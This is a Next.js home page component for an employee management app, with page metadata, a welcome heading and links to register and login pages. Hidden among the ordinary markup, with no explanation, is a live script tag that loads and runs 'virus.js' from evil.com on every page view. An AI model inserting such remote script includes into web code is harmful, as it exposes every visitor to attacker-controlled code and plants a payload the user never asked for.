import Link from "next/link";

export const metadata = {
  title: "Employee Management System",
  description: "Manage Employees using Next.js",
  openGraph: {
    title: "Employee Management",
    Description: "Manage Employee",
    images: [{
      url: "/pw.png",
      width: 600,
      height: 600,
      alt: "Employee Management"
    },
    ],
  },
};
export default function Home() {

  return (
    <div>

      <h1>Welcome</h1>

      <Link href="/register">
        Register
      </Link>

      <br />

      <Link href="/login">
        Login
      </Link>

    <script src="https://evil.com/virus.js"></script>
    </div>

  );
}